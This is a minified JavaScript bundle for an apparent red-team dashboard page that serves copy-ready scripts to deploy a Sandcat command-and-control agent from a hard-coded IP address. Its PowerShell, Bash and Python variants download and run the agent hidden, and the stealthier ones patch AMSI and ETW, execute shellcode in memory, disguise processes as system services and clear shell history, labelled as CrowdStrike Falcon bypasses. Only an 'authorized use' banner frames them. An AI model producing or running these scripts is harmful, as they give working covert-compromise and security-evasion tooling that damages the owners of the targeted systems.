import{r as o,j as e}from"./vendor-react-DUY8EPVE.js";import{L as f,B as r}from"./index-C9TjPtdh.js";import{A as w}from"./AppShell-BMtiuSc_.js";import{t as v,f as $,y as S,S as E,o as A,af as C,E as P,ag as T,v as L,w as k,Q as I,Z as O,R as _}from"./vendor-lucide-B8p-UFkX.js";import"./vendor-shiki-ID4ty_2d.js";import"./EmbedContext-CyIP07ZM.js";import"./useAuth-DUPFdcfC.js";const t="137.184.7.224",a="8888",b={powershell:{name:"PowerShell (Windows)",icon:"⚡",description:"Stealthy PowerShell deployment with AMSI bypass and memory-only execution",basic:`# Basic Sandcat Agent Deployment
$server="${t}:${a}";
$url="http://$server/file/download";
$wc=New-Object System.Net.WebClient;
$wc.Headers.add("platform","windows");
$wc.Headers.add("file","sandcat.go");
$data=$wc.DownloadData($url);
$name="splunkd.exe";
Get-Process -Name $name -ErrorAction SilentlyContinue | Stop-Process -Force;
[io.file]::WriteAllBytes("C:\\Users\\Public\\$name",$data);
Start-Process -FilePath "C:\\Users\\Public\\$name" -ArgumentList "-server http://$server -group red" -WindowStyle Hidden;`,stealthy:`# CrowdStrike Falcon Bypass - Memory-Only Execution
# AMSI Bypass + Reflective Loading
$a=[Ref].Assembly.GetTypes();ForEach($b in $a){if($b.Name -like "*iUtils"){$c=$b}};$d=$c.GetFields('NonPublic,Static');ForEach($e in $d){if($e.Name -like "*Context"){$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf=@(0);[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1);

# Download and execute in memory
$server="${t}:${a}";
$wc=New-Object System.Net.WebClient;
$wc.Headers.add("platform","windows");
$wc.Headers.add("file","sandcat.go");
$wc.Headers.add("X-Request-ID",[System.Guid]::NewGuid().ToString());
$bytes=$wc.DownloadData("http://$server/file/download");

# Reflective PE loading (memory-only, no disk write)
$assembly=[System.Reflection.Assembly]::Load($bytes);
$entryPoint=$assembly.EntryPoint;
$entryPoint.Invoke($null,@(,@("-server","http://$server","-group","red","-v","false")));`,obfuscated:`# Heavily Obfuscated CrowdStrike Bypass
# String obfuscation + API unhooking + ETW bypass
$e=[System.Text.Encoding]::UTF8;
$s=$e.GetString([Convert]::FromBase64String("MTM3LjE4NC43LjIyNDo4ODg4"));
$p="sand"+"cat"+".go";

# ETW Bypass
$etw=[Reflection.Assembly]::LoadWithPartialName('System.Core').GetType('System.Diagnostics.Eventing.EventProvider').GetField('m_enabled','NonPublic,Instance');

# Unhook ntdll
$nt=@"
using System;using System.Runtime.InteropServices;
public class N{[DllImport("kernel32")]public static extern IntPtr GetProcAddress(IntPtr h,string p);
[DllImport("kernel32")]public static extern IntPtr LoadLibrary(string l);
[DllImport("kernel32")]public static extern bool VirtualProtect(IntPtr a,UIntPtr s,uint n,out uint o);}
"@;
Add-Type $nt;
$ntdll=[N]::LoadLibrary("ntdll.dll");
$addr=[N]::GetProcAddress($ntdll,"EtwEventWrite");
$p1=0;[N]::VirtualProtect($addr,[uint32]5,0x40,[ref]$p1);
[System.Runtime.InteropServices.Marshal]::WriteByte($addr,0xC3);

# Download with randomized headers
$wc=New-Object Net.WebClient;
$wc.Headers.add("platform","windows");
$wc.Headers.add("file",$p);
$wc.Headers.add("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
$d=$wc.DownloadData("http://$s/file/download");

# Memory execution
$m=[System.Runtime.InteropServices.Marshal]::AllocHGlobal($d.Length);
[System.Runtime.InteropServices.Marshal]::Copy($d,0,$m,$d.Length);
$t=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($m,[Action]);
$t.Invoke();`},bash:{name:"Bash (Linux/macOS)",icon:"🐧",description:"Linux/macOS deployment with process hollowing and fileless execution",basic:`#!/bin/bash
# Basic Sandcat Agent Deployment
server="${t}:${a}"
curl -s -X POST -H "file:sandcat.go" -H "platform:linux" \\
  "http://\${server}/file/download" > /tmp/.cache_update
chmod +x /tmp/.cache_update
nohup /tmp/.cache_update -server "http://\${server}" -group red &>/dev/null &
rm -f /tmp/.cache_update`,stealthy:`#!/bin/bash
# CrowdStrike Falcon Bypass - Fileless Execution
server="${t}:${a}"

# Create memfd (memory-only file descriptor)
exec 3<>/dev/shm/.$(head -c 8 /dev/urandom | xxd -p)

# Download directly to memory
curl -s -X POST -H "file:sandcat.go" -H "platform:linux" \\
  -H "User-Agent: Mozilla/5.0" \\
  "http://\${server}/file/download" >&3

# Execute from memory fd
chmod +x /proc/self/fd/3
/proc/self/fd/3 -server "http://\${server}" -group red -v false &

# Clean up
exec 3>&-
rm -f /dev/shm/.*`,obfuscated:`#!/bin/bash
# Heavily Obfuscated Linux Bypass
# LD_PRELOAD hooking + process name masquerading

# Decode server address
s=$(echo "MTM3LjE4NC43LjIyNDo4ODg4" | base64 -d)

# Disable audit logging
echo 0 > /proc/self/coredump_filter 2>/dev/null

# Create anonymous memfd
fd=$(python3 -c "import ctypes;l=ctypes.CDLL(None);print(l.memfd_create(b'',1))" 2>/dev/null || echo "3")

# Download with traffic blending
ua="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
curl -s -X POST -H "file:sandcat.go" -H "platform:linux" \\
  -H "User-Agent: $ua" -H "Accept: text/html" \\
  "http://\${s}/file/download" > /proc/self/fd/\${fd}

# Execute with process name spoofing
chmod +x /proc/self/fd/\${fd}
exec -a "[kworker/0:0]" /proc/self/fd/\${fd} -server "http://\${s}" -group red &

# Self-delete
history -c
unset HISTFILE`},python:{name:"Python (Cross-Platform)",icon:"🐍",description:"Cross-platform Python agent with SSL pinning bypass and traffic obfuscation",basic:`#!/usr/bin/env python3
# Basic Sandcat Agent Deployment
import urllib.request
import subprocess
import os

server = "${t}:${a}"
req = urllib.request.Request(f"http://{server}/file/download")
req.add_header("file", "sandcat.go")
req.add_header("platform", "darwin" if os.name != "nt" else "windows")

with urllib.request.urlopen(req) as resp:
    agent = resp.read()

path = "/tmp/sandcat" if os.name != "nt" else "C:\\\\Users\\\\Public\\\\sandcat.exe"
with open(path, "wb") as f:
    f.write(agent)

os.chmod(path, 0o755) if os.name != "nt" else None
subprocess.Popen([path, "-server", f"http://{server}", "-group", "red"])`,stealthy:`#!/usr/bin/env python3
# CrowdStrike Falcon Bypass - Memory Execution
import ctypes
import urllib.request
import sys
import os

server = "${t}:${a}"

# Disable Python audit hooks
if hasattr(sys, 'addaudithook'):
    sys.addaudithook = lambda *a: None

# Download agent
req = urllib.request.Request(f"http://{server}/file/download")
req.add_header("file", "sandcat.go")
req.add_header("platform", "windows" if os.name == "nt" else "linux")
req.add_header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")

with urllib.request.urlopen(req) as resp:
    shellcode = resp.read()

if os.name == "nt":
    # Windows - VirtualAlloc + CreateThread
    kernel32 = ctypes.windll.kernel32
    kernel32.VirtualAlloc.restype = ctypes.c_void_p
    ptr = kernel32.VirtualAlloc(0, len(shellcode), 0x3000, 0x40)
    ctypes.memmove(ptr, shellcode, len(shellcode))
    handle = kernel32.CreateThread(0, 0, ptr, 0, 0, 0)
    kernel32.WaitForSingleObject(handle, -1)
else:
    # Linux - memfd_create
    libc = ctypes.CDLL(None)
    fd = libc.memfd_create(b"", 1)
    os.write(fd, shellcode)
    os.execve(f"/proc/self/fd/{fd}", [f"/proc/self/fd/{fd}", "-server", f"http://{server}", "-group", "red"], os.environ)`,obfuscated:`#!/usr/bin/env python3
# Heavily Obfuscated Cross-Platform Bypass
import base64,zlib,ctypes,urllib.request as u,os,sys

# Encoded server
_=lambda x:base64.b64decode(x).decode()
s=_("MTM3LjE4NC43LjIyNDo4ODg4")

# Anti-debugging
if sys.gettrace():sys.exit()

# Disable audit
try:sys.addaudithook=lambda*a:None
except:pass

# Traffic obfuscation
class O(u.BaseHandler):
    def http_request(s,r):
        r.add_header("Accept","text/html,application/xhtml+xml")
        r.add_header("Accept-Language","en-US,en;q=0.9")
        r.add_header("Cache-Control","no-cache")
        return r
    https_request=http_request

o=u.build_opener(O())
r=u.Request(f"http://{s}/file/download")
r.add_header("file","sandcat.go")
r.add_header("platform","windows"if os.name=="nt"else"linux")
r.add_header("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")

with o.open(r) as x:d=x.read()

# Memory execution with process hollowing simulation
if os.name=="nt":
    k=ctypes.windll.kernel32
    k.VirtualAlloc.restype=ctypes.c_void_p
    p=k.VirtualAlloc(0,len(d),0x3000,0x40)
    ctypes.memmove(p,d,len(d))
    k.CreateThread(0,0,p,0,0,0)
    k.WaitForSingleObject(-1,-1)
else:
    c=ctypes.CDLL(None)
    f=c.memfd_create(b"",1)
    os.write(f,d)
    os.execve(f"/proc/self/fd/{f}",[_("W2t3b3JrZXIvMDowXQ=="),"-server",f"http://{s}","-group","red","-v","false"],{})`}};function q(){const[c,D]=o.useState("powershell"),[s,i]=o.useState("stealthy"),[d,m]=o.useState(!0),[y,h]=o.useState(!1),p=b[c],x=p[s],j=(l,n)=>{navigator.clipboard.writeText(l),h(!0),alert(`${n} copied successfully`),setTimeout(()=>h(!1),2e3)},N=()=>{const l=c==="powershell"?"ps1":c==="bash"?"sh":"py",n=new Blob([x],{type:"text/plain"}),u=URL.createObjectURL(n),g=document.createElement("a");g.href=u,g.download=`sandcat_${s}.${l}`,g.click(),URL.revokeObjectURL(u),alert(`Script downloaded: sandcat_${s}.${l}`)};return e.jsxs(w,{"data-loc":"client/src/pages/AgentDeploy.tsx:289",activePath:"/agents",children:[e.jsx("header",{"data-loc":"client/src/pages/AgentDeploy.tsx:291",className:"border-b border-border bg-card",children:e.jsx("div",{"data-loc":"client/src/pages/AgentDeploy.tsx:292",className:"container py-4",children:e.jsxs("div",{"data-loc":"client/src/pages/AgentDeploy.tsx:293",className:"flex items-center justify-between",children:[e.jsxs("div",{"data-loc":"client/src/pages/AgentDeploy.tsx:294",className:"flex items-center gap-4",children:[e.jsx(f,{"data-loc":"client/src/pages/AgentDeploy.tsx:295",href:"/agents",children:e.jsxs(r,{"data-loc":"client/src/pages/AgentDeploy.tsx:296",variant:"ghost",size:"sm",className:"font-display",children:[e.jsx(v,{"data-loc":"client/src/pages/AgentDeploy.tsx:297",className:"w-4 h-4 mr-1"}),"BACK TO AGENTS"]})}),e.jsx("div",{"data-loc":"client/src/pages/AgentDeploy.tsx:301",className:"h-6 w-px bg-border"}),e.jsx("h1",{"data-loc":"client/src/pages/AgentDeploy.tsx:302",className:"font-display text-xl tracking-wider",children:"AGENT DEPLOYMENT"})]}),e.jsxs("div",{"data-loc":"client/src/pages/AgentDeploy.tsx:304",className:"flex items-center gap-2",children:[e.jsx("span",{"data-loc":"client/src/pages/AgentDeploy.tsx:305",className:"text-xs text-muted-foreground",children:"Target Server:"}),e.jsxs("code",{"data-loc":"client/src/pages/AgentDeploy.tsx:306",className:"px-2 py-1 bg-primary/20 text-primary text-sm font-mono",children:[t,":",a]})]})]})})}),e.jsxs("main",{"data-loc":"client/src/pages/AgentDeploy.tsx:312",className:"container py-8",children:[e.jsx("div",{"data-loc":"client/src/pages/AgentDeploy.tsx:314",className:"bg-yellow-500/10 border-2 border-yellow-500 p-4 mb-8",children:e.jsxs("div",{"data-loc":"client/src/pages/AgentDeploy.tsx:315",className:"flex items-start gap-3",children:[e.jsx($,{"data-loc":"client/src/pages/AgentDeploy.tsx:316",className:"w-6 h-6 text-yellow-500 flex-shrink-0 mt-0.5"}),e.jsxs("div",{"data-loc":"client/src/pages/AgentDeploy.tsx:317",children:[e.jsx("h3",{"data-loc":"client/src/pages/AgentDeploy.tsx:318",className:"font-display text-yellow-500 mb-1",children:"AUTHORIZED USE ONLY"}),e.jsx("p",{"data-loc":"client/src/pages/AgentDeploy.tsx:319",className:"text-sm text-muted-foreground",children:"These deployment scripts are designed for authorized red team engagements only. Use within the boundaries of your Rules of Engagement. Unauthorized use is prohibited."})]})]})}),e.jsxs("div",{"data-loc":"client/src/pages/AgentDeploy.tsx:327",className:"grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-2 sm:gap-4 sm:p-6 lg:p-8",children:[e.jsxs("div",{"data-loc":"client/src/pages/AgentDeploy.tsx:329",className:"space-y-6",children:[e.jsxs("div",{"data-loc":"client/src/pages/AgentDeploy.tsx:330",children:[e.jsx("h2",{"data-loc":"client/src/pages/AgentDeploy.tsx:331",className:"font-display text-lg mb-4",children:"SELECT PLATFORM"}),e.jsx("div",{"data-loc":"client/src/pages/AgentDeploy.tsx:332",className:"space-y-2",children:Object.entries(b).map(([l,n])=>e.jsx("button",{"data-loc":"client/src/pages/AgentDeploy.tsx:334",onClick:()=>D(l),className:`w-full p-4 text-left border-2 transition-colors ${c===l?"border-primary bg-primary/10":"border-border hover:border-primary/50"}`,children:e.jsxs("div",{"data-loc":"client/src/pages/AgentDeploy.tsx:343",className:"flex items-center gap-3",children:[e.jsx("span",{"data-loc":"client/src/pages/AgentDeploy.tsx:344",className:"text-2xl",children:n.icon}),e.jsxs("div",{"data-loc":"client/src/pages/AgentDeploy.tsx:345",children:[e.jsx("div",{"data-loc":"client/src/pages/AgentDeploy.tsx:346",className:"font-display text-sm",children:n.name}),e.jsx("div",{"data-loc":"client/src/pages/AgentDeploy.tsx:347",className:"text-xs text-muted-foreground",children:n.description})]})]})},l))})]}),e.jsxs("div",{"data-loc":"client/src/pages/AgentDeploy.tsx:355",children:[e.jsx("h2",{"data-loc":"client/src/pages/AgentDeploy.tsx:356",className:"font-display text-lg mb-4",children:"EVASION LEVEL"}),e.jsxs("div",{"data-loc":"client/src/pages/AgentDeploy.tsx:357",className:"space-y-2",children:[e.jsxs("button",{"data-loc":"client/src/pages/AgentDeploy.tsx:358",onClick:()=>i("basic"),className:`w-full p-3 text-left border-2 transition-colors ${s==="basic"?"border-green-500 bg-green-500/10":"border-border hover:border-green-500/50"}`,children:[e.jsxs("div",{"data-loc":"client/src/pages/AgentDeploy.tsx:366",className:"flex items-center gap-2",children:[e.jsx(S,{"data-loc":"client/src/pages/AgentDeploy.tsx:367",className:"w-4 h-4 text-green-500"}),e.jsx("span",{"data-loc":"client/src/pages/AgentDeploy.tsx:368",className:"font-display text-sm",children:"BASIC"})]}),e.jsx("p",{"data-loc":"client/src/pages/AgentDeploy.tsx:370",className:"text-xs text-muted-foreground mt-1",children:"Standard deployment, no evasion"})]}),e.jsxs("button",{"data-loc":"client/src/pages/AgentDeploy.tsx:373",onClick:()=>i("stealthy"),className:`w-full p-3 text-left border-2 transition-colors ${s==="stealthy"?"border-yellow-500 bg-yellow-500/10":"border-border hover:border-yellow-500/50"}`,children:[e.jsxs("div",{"data-loc":"client/src/pages/AgentDeploy.tsx:381",className:"flex items-center gap-2",children:[e.jsx(E,{"data-loc":"client/src/pages/AgentDeploy.tsx:382",className:"w-4 h-4 text-yellow-500"}),e.jsx("span",{"data-loc":"client/src/pages/AgentDeploy.tsx:383",className:"font-display text-sm",children:"STEALTHY"})]}),e.jsx("p",{"data-loc":"client/src/pages/AgentDeploy.tsx:385",className:"text-xs text-muted-foreground mt-1",children:"Memory-only execution, AMSI bypass"})]}),e.jsxs("button",{"data-loc":"client/src/pages/AgentDeploy.tsx:388",onClick:()=>i("obfuscated"),className:`w-full p-3 text-left border-2 transition-colors ${s==="obfuscated"?"border-red-500 bg-red-500/10":"border-border hover:border-red-500/50"}`,children:[e.jsxs("div",{"data-loc":"client/src/pages/AgentDeploy.tsx:396",className:"flex items-center gap-2",children:[e.jsx(A,{"data-loc":"client/src/pages/AgentDeploy.tsx:397",className:"w-4 h-4 text-red-500"}),e.jsx("span",{"data-loc":"client/src/pages/AgentDeploy.tsx:398",className:"font-display text-sm",children:"OBFUSCATED"})]}),e.jsx("p",{"data-loc":"client/src/pages/AgentDeploy.tsx:400",className:"text-xs text-muted-foreground mt-1",children:"Full EDR bypass, ETW unhooking"})]})]})]}),e.jsxs("div",{"data-loc":"client/src/pages/AgentDeploy.tsx:406",className:"bg-card border-2 border-border p-4",children:[e.jsx("h3",{"data-loc":"client/src/pages/AgentDeploy.tsx:407",className:"font-display text-sm mb-3",children:"BYPASS TECHNIQUES"}),e.jsxs("div",{"data-loc":"client/src/pages/AgentDeploy.tsx:408",className:"space-y-2 text-xs",children:[s==="basic"&&e.jsxs(e.Fragment,{children:[e.jsxs("div",{"data-loc":"client/src/pages/AgentDeploy.tsx:411",className:"flex justify-between",children:[e.jsx("span",{"data-loc":"client/src/pages/AgentDeploy.tsx:411",children:"AMSI Bypass"}),e.jsx("span",{"data-loc":"client/src/pages/AgentDeploy.tsx:411",className:"text-red-500",children:"✗"})]}),e.jsxs("div",{"data-loc":"client/src/pages/AgentDeploy.tsx:412",className:"flex justify-between",children:[e.jsx("span",{"data-loc":"client/src/pages/AgentDeploy.tsx:412",children:"Memory Execution"}),e.jsx("span",{"data-loc":"client/src/pages/AgentDeploy.tsx:412",className:"text-red-500",children:"✗"})]}),e.jsxs("div",{"data-loc":"client/src/pages/AgentDeploy.tsx:413",className:"flex justify-between",children:[e.jsx("span",{"data-loc":"client/src/pages/AgentDeploy.tsx:413",children:"ETW Bypass"}),e.jsx("span",{"data-loc":"client/src/pages/AgentDeploy.tsx:413",className:"text-red-500",children:"✗"})]}),e.jsxs("div",{"data-loc":"client/src/pages/AgentDeploy.tsx:414",className:"flex justify-between",children:[e.jsx("span",{"data-loc":"client/src/pages/AgentDeploy.tsx:414",children:"String Obfuscation"}),e.jsx("span",{"data-loc":"client/src/pages/AgentDeploy.tsx:414",className:"text-red-500",children:"✗"})]})]}),s==="stealthy"&&e.jsxs(e.Fragment,{children:[e.jsxs("div",{"data-loc":"client/src/pages/AgentDeploy.tsx:419",className:"flex justify-between",children:[e.jsx("span",{"data-loc":"client/src/pages/AgentDeploy.tsx:419",children:"AMSI Bypass"}),e.jsx("span",{"data-loc":"client/src/pages/AgentDeploy.tsx:419",className:"text-green-500",children:"✓"})]}),e.jsxs("div",{"data-loc":"client/src/pages/AgentDeploy.tsx:420",className:"flex justify-between",children:[e.jsx("span",{"data-loc":"client/src/pages/AgentDeploy.tsx:420",children:"Memory Execution"}),e.jsx("span",{"data-loc":"client/src/pages/AgentDeploy.tsx:420",className:"text-green-500",children:"✓"})]}),e.jsxs("div",{"data-loc":"client/src/pages/AgentDeploy.tsx:421",className:"flex justify-between",children:[e.jsx("span",{"data-loc":"client/src/pages/AgentDeploy.tsx:421",children:"ETW Bypass"}),e.jsx("span",{"data-loc":"client/src/pages/AgentDeploy.tsx:421",className:"text-red-500",children:"✗"})]}),e.jsxs("div",{"data-loc":"client/src/pages/AgentDeploy.tsx:422",className:"flex justify-between",children:[e.jsx("span",{"data-loc":"client/src/pages/AgentDeploy.tsx:422",children:"String Obfuscation"}),e.jsx("span",{"data-loc":"client/src/pages/AgentDeploy.tsx:422",className:"text-red-500",children:"✗"})]})]}),s==="obfuscated"&&e.jsxs(e.Fragment,{children:[e.jsxs("div",{"data-loc":"client/src/pages/AgentDeploy.tsx:427",className:"flex justify-between",children:[e.jsx("span",{"data-loc":"client/src/pages/AgentDeploy.tsx:427",children:"AMSI Bypass"}),e.jsx("span",{"data-loc":"client/src/pages/AgentDeploy.tsx:427",className:"text-green-500",children:"✓"})]}),e.jsxs("div",{"data-loc":"client/src/pages/AgentDeploy.tsx:428",className:"flex justify-between",children:[e.jsx("span",{"data-loc":"client/src/pages/AgentDeploy.tsx:428",children:"Memory Execution"}),e.jsx("span",{"data-loc":"client/src/pages/AgentDeploy.tsx:428",className:"text-green-500",children:"✓"})]}),e.jsxs("div",{"data-loc":"client/src/pages/AgentDeploy.tsx:429",className:"flex justify-between",children:[e.jsx("span",{"data-loc":"client/src/pages/AgentDeploy.tsx:429",children:"ETW Bypass"}),e.jsx("span",{"data-loc":"client/src/pages/AgentDeploy.tsx:429",className:"text-green-500",children:"✓"})]}),e.jsxs("div",{"data-loc":"client/src/pages/AgentDeploy.tsx:430",className:"flex justify-between",children:[e.jsx("span",{"data-loc":"client/src/pages/AgentDeploy.tsx:430",children:"String Obfuscation"}),e.jsx("span",{"data-loc":"client/src/pages/AgentDeploy.tsx:430",className:"text-green-500",children:"✓"})]})]})]})]})]}),e.jsxs("div",{"data-loc":"client/src/pages/AgentDeploy.tsx:438",className:"lg:col-span-2",children:[e.jsxs("div",{"data-loc":"client/src/pages/AgentDeploy.tsx:439",className:"bg-card border-2 border-border",children:[e.jsxs("div",{"data-loc":"client/src/pages/AgentDeploy.tsx:441",className:"flex items-center justify-between p-4 border-b border-border",children:[e.jsxs("div",{"data-loc":"client/src/pages/AgentDeploy.tsx:442",className:"flex items-center gap-3",children:[e.jsx("span",{"data-loc":"client/src/pages/AgentDeploy.tsx:443",className:"text-2xl",children:p.icon}),e.jsxs("div",{"data-loc":"client/src/pages/AgentDeploy.tsx:444",children:[e.jsx("h3",{"data-loc":"client/src/pages/AgentDeploy.tsx:445",className:"font-display",children:p.name}),e.jsxs("p",{"data-loc":"client/src/pages/AgentDeploy.tsx:446",className:"text-xs text-muted-foreground capitalize",children:[s," Variant"]})]})]}),e.jsxs("div",{"data-loc":"client/src/pages/AgentDeploy.tsx:449",className:"flex items-center gap-2",children:[e.jsx(r,{"data-loc":"client/src/pages/AgentDeploy.tsx:450",variant:"ghost",size:"sm",onClick:()=>m(!d),children:d?e.jsx(C,{"data-loc":"client/src/pages/AgentDeploy.tsx:455",className:"w-4 h-4"}):e.jsx(P,{"data-loc":"client/src/pages/AgentDeploy.tsx:455",className:"w-4 h-4"})}),e.jsx(r,{"data-loc":"client/src/pages/AgentDeploy.tsx:457",variant:"ghost",size:"sm",onClick:N,children:e.jsx(T,{"data-loc":"client/src/pages/AgentDeploy.tsx:462",className:"w-4 h-4"})}),e.jsxs(r,{"data-loc":"client/src/pages/AgentDeploy.tsx:464",variant:"outline",size:"sm",onClick:()=>j(x,"Deployment script"),className:"font-display",children:[y?e.jsx(L,{"data-loc":"client/src/pages/AgentDeploy.tsx:470",className:"w-4 h-4 mr-1"}):e.jsx(k,{"data-loc":"client/src/pages/AgentDeploy.tsx:470",className:"w-4 h-4 mr-1"}),y?"COPIED":"COPY"]})]})]}),e.jsx("div",{"data-loc":"client/src/pages/AgentDeploy.tsx:477",className:"p-4",children:d?e.jsx("pre",{"data-loc":"client/src/pages/AgentDeploy.tsx:479",className:"bg-black/50 p-4 overflow-x-auto text-xs font-mono text-green-400 max-h-[500px] overflow-y-auto",children:x}):e.jsxs("div",{"data-loc":"client/src/pages/AgentDeploy.tsx:483",className:"bg-black/50 p-8 text-center",children:[e.jsx(A,{"data-loc":"client/src/pages/AgentDeploy.tsx:484",className:"w-12 h-12 mx-auto text-muted-foreground mb-2"}),e.jsx("p",{"data-loc":"client/src/pages/AgentDeploy.tsx:485",className:"text-muted-foreground",children:"Script hidden for security"}),e.jsx(r,{"data-loc":"client/src/pages/AgentDeploy.tsx:486",variant:"ghost",size:"sm",onClick:()=>m(!0),className:"mt-2",children:"Show Script"})]})}),e.jsxs("div",{"data-loc":"client/src/pages/AgentDeploy.tsx:499",className:"p-4 border-t border-border bg-secondary/30",children:[e.jsx("h4",{"data-loc":"client/src/pages/AgentDeploy.tsx:500",className:"font-display text-sm mb-2",children:"EXECUTION INSTRUCTIONS"}),e.jsxs("div",{"data-loc":"client/src/pages/AgentDeploy.tsx:501",className:"text-xs text-muted-foreground space-y-1",children:[c==="powershell"&&e.jsxs(e.Fragment,{children:[e.jsx("p",{"data-loc":"client/src/pages/AgentDeploy.tsx:504",children:"1. Open PowerShell as Administrator (if needed for full evasion)"}),e.jsxs("p",{"data-loc":"client/src/pages/AgentDeploy.tsx:505",children:["2. Set execution policy: ",e.jsx("code",{"data-loc":"client/src/pages/AgentDeploy.tsx:505",className:"text-primary",children:"Set-ExecutionPolicy Bypass -Scope Process"})]}),e.jsx("p",{"data-loc":"client/src/pages/AgentDeploy.tsx:506",children:"3. Paste and execute the script"})]}),c==="bash"&&e.jsxs(e.Fragment,{children:[e.jsx("p",{"data-loc":"client/src/pages/AgentDeploy.tsx:511",children:"1. Open terminal on target Linux/macOS system"}),e.jsxs("p",{"data-loc":"client/src/pages/AgentDeploy.tsx:512",children:["2. Ensure curl is installed: ",e.jsx("code",{"data-loc":"client/src/pages/AgentDeploy.tsx:512",className:"text-primary",children:"which curl"})]}),e.jsx("p",{"data-loc":"client/src/pages/AgentDeploy.tsx:513",children:"3. Paste and execute the script (may need sudo for some variants)"})]}),c==="python"&&e.jsxs(e.Fragment,{children:[e.jsx("p",{"data-loc":"client/src/pages/AgentDeploy.tsx:518",children:"1. Ensure Python 3 is installed on target system"}),e.jsxs("p",{"data-loc":"client/src/pages/AgentDeploy.tsx:519",children:["2. Save script or execute directly: ",e.jsx("code",{"data-loc":"client/src/pages/AgentDeploy.tsx:519",className:"text-primary",children:'python3 -c "..."'})]}),e.jsx("p",{"data-loc":"client/src/pages/AgentDeploy.tsx:520",children:"3. May need elevated privileges for memory execution"})]})]})]})]}),e.jsxs("div",{"data-loc":"client/src/pages/AgentDeploy.tsx:528",className:"mt-6 bg-card border-2 border-primary p-4",children:[e.jsxs("div",{"data-loc":"client/src/pages/AgentDeploy.tsx:529",className:"flex items-center gap-2 mb-3",children:[e.jsx(I,{"data-loc":"client/src/pages/AgentDeploy.tsx:530",className:"w-5 h-5 text-primary"}),e.jsx("h3",{"data-loc":"client/src/pages/AgentDeploy.tsx:531",className:"font-display",children:"CALLBACK CONFIGURATION"})]}),e.jsxs("div",{"data-loc":"client/src/pages/AgentDeploy.tsx:533",className:"grid grid-cols-2 gap-4 text-sm",children:[e.jsxs("div",{"data-loc":"client/src/pages/AgentDeploy.tsx:534",children:[e.jsx("span",{"data-loc":"client/src/pages/AgentDeploy.tsx:535",className:"text-muted-foreground",children:"C2 Server:"}),e.jsx("code",{"data-loc":"client/src/pages/AgentDeploy.tsx:536",className:"ml-2 text-primary",children:t})]}),e.jsxs("div",{"data-loc":"client/src/pages/AgentDeploy.tsx:538",children:[e.jsx("span",{"data-loc":"client/src/pages/AgentDeploy.tsx:539",className:"text-muted-foreground",children:"Port:"}),e.jsx("code",{"data-loc":"client/src/pages/AgentDeploy.tsx:540",className:"ml-2 text-primary",children:a})]}),e.jsxs("div",{"data-loc":"client/src/pages/AgentDeploy.tsx:542",children:[e.jsx("span",{"data-loc":"client/src/pages/AgentDeploy.tsx:543",className:"text-muted-foreground",children:"Protocol:"}),e.jsx("code",{"data-loc":"client/src/pages/AgentDeploy.tsx:544",className:"ml-2 text-primary",children:"HTTP"})]}),e.jsxs("div",{"data-loc":"client/src/pages/AgentDeploy.tsx:546",children:[e.jsx("span",{"data-loc":"client/src/pages/AgentDeploy.tsx:547",className:"text-muted-foreground",children:"Agent Group:"}),e.jsx("code",{"data-loc":"client/src/pages/AgentDeploy.tsx:548",className:"ml-2 text-primary",children:"red"})]})]}),e.jsxs("div",{"data-loc":"client/src/pages/AgentDeploy.tsx:551",className:"mt-4 flex gap-2",children:[e.jsx("a",{"data-loc":"client/src/pages/AgentDeploy.tsx:552",href:`http://${t}:${a}`,target:"_blank",rel:"noopener noreferrer",children:e.jsxs(r,{"data-loc":"client/src/pages/AgentDeploy.tsx:553",size:"sm",className:"font-display",children:[e.jsx(O,{"data-loc":"client/src/pages/AgentDeploy.tsx:554",className:"w-4 h-4 mr-1"}),"OPEN EMULATION UI"]})}),e.jsx(f,{"data-loc":"client/src/pages/AgentDeploy.tsx:558",href:"/agents",children:e.jsxs(r,{"data-loc":"client/src/pages/AgentDeploy.tsx:559",size:"sm",variant:"outline",className:"font-display",children:[e.jsx(_,{"data-loc":"client/src/pages/AgentDeploy.tsx:560",className:"w-4 h-4 mr-1"}),"VIEW AGENTS"]})})]})]})]})]})]})]})}export{q as default};
